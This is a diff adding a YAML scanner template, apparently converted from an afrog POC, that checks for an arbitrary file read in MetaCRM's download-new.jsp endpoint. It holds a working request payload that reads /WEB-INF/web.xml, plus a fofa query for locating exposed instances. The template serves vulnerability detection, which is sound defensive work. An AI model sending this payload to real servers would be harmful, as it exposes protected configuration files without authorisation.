@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      filename=1.png&page=/WEB-INF/web.xml
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <web-app
+          - </web-app>
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/business/common/download-new.jsp'
+id: metacrm-download-new-fileread
+info:
+  author: avic123
+  description: |-
+    MetaCRM美特crm系统download-new.jsp接口存在任意文件读取漏洞
+    fofa: body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: MetaCRM美特crm系统download-new.jsp接口存在任意文件读取漏洞
+  severity: high
+  tags: metaCRM,fileread,argus-import
